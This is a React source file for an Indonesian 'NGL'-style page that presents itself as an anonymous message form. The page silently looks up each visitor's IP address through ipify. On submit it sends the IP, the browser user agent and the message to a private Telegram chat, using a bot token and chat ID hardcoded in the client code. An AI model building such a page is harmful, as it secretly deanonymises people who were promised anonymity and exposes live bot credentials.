import { useState, useEffect } from "react";

export default function NGLPage() {
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ip: "Tidak diketahui",
    userAgent: navigator.userAgent,
    device: "Tidak diketahui",
  });

  useEffect(() => {
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        setUserInfo((prev) => ({ ...prev, ip: data.ip }));
      } catch (err) {
        console.error("Error fetching IP info:", err);
      }
    };
    fetchIP();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
    const chatId = "1516343905";

    if (message.trim() === "") {
      alert("Pesan tidak boleh kosong!");
      return;
    }

    setLoading(true);
    setSuccess(false);

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Pesan anonim dari:
IP: ${userInfo.ip}
USER AGENT: ${userInfo.userAgent}

PESAN: ${message}`,
          }),
        }
      );

      if (response.ok) {
        setMessage("");
        setSuccess(true);
      } else {
        alert("Gagal mengirim pesan. Coba lagi.");
      }
    } catch (error) {
      alert("Terjadi kesalahan. Coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const closePopup = () => setSuccess(false);

  return (
    <div className="min-h-screen bg-gray-900 text-gray-100 flex flex-col">
      {/* Navbar */}
      <nav className="bg-gray-800 p-4 flex justify-between items-center">
        <div className="text-xl font-bold flex items-center space-x-2">
          <i className="fas fa-angle-double-right"></i>
          <span>MINN</span>
        </div>
        <i className="fas fa-user-circle text-2xl"></i>
      </nav>

      {/* Content */}
      <main className="flex-grow p-6">
        <h1 className="text-2xl font-semibold mb-4 flex items-center">
          <i className="fas fa-download mr-2"></i> NGL - MIN
        </h1>

        {/* Form */}
        <form
          className="bg-gray-800 p-6 rounded-lg shadow-md space-y-4"
          onSubmit={handleSubmit}
        >
          <div className="space-y-2">
            <label className="block font-medium">Pesan Anonim:</label>
            <textarea
              className="w-full p-3 border border-gray-700 rounded bg-gray-900 text-gray-100"
              placeholder="Tulis pesan Anda..."
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              disabled={loading}
            ></textarea>
          </div>

          <button
            type="submit"
            className={`w-full py-2 px-4 rounded font-bold text-white transition ${
              loading
                ? "bg-gray-600 cursor-not-allowed"
                : "bg-blue-600 hover:bg-blue-700"
            }`}
            disabled={loading}
          >
            {loading ? "Mengirim..." : "Kirim"}
          </button>
        </form>

        {/* Success Popup */}
        {success && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
            <div className="bg-white text-gray-900 p-6 rounded-lg shadow-lg">
              <i className="fas fa-check-circle text-green-500 text-4xl mb-4"></i>
              <p className="text-lg font-semibold">Pesan berhasil dikirim!</p>
              <button
                className="mt-4 px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600"
                onClick={closePopup}
              >
                OK
              </button>
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 p-4 text-center text-sm">
        Made with <i className="fas fa-heart text-red-500"></i> by Minn.
      </footer>
    </div>
  );
}